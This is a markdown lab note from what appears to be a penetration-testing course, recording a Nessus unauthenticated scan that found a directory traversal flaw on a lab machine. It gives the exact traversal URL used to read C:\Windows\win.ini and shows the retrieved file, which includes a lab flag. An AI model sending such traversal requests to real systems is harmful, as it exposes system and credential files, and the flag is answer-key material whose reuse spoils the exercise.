---
title: Nessus Unauthenticated Scan of Gamma
aliases: []
tags:
- tool/nessus
- os/windows
- vulnerabilities
category: detections
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: lab.md
related_tools:
- '[[nessus]]'
related_techniques: []
related_tactics: []
related_services: []
related_os:
- '[[C:\Windows\win.ini]]'
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: windows
---

# Nessus Unauthenticated Scan of Gamma

## Exercise Overview
This exercise involves performing an unauthenticated scan using Nessus on a machine named Gamma. The steps include creating the scan, analyzing the results, and identifying the steps taken by the scanner. Additionally, the exercise requires performing a Basic Network Scan on a victim machine running on VM #1, which has a vulnerability allowing directory traversal and arbitrary file access.

## Nessus Scan Details
The scan was performed on the victim machine with the IP address 192.168.162.54. Nessus was able to access the file `C:\Windows\win.ini` using the following URL:

```
http://192.168.162.54:27498/../../../../../../../../../../../../windows/win.ini
```

## File Contents
The contents of the `win.ini` file retrieved by Nessus are as follows:

```
﻿; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
; OS{cc407ed31b68267e4058d8e9937a20e3}
```

## Observations
Nessus stopped searching after finding one exploit. To report all known exploits, the 'Perform thorough tests' setting should be enabled and the scan should be re-run.

## References
- https://github.com/offsec-labs/PEN-200/blob/main/8.2.5%20Nessus%20Vulnerability%20Scanning%20Unauthenticated%20scan.md

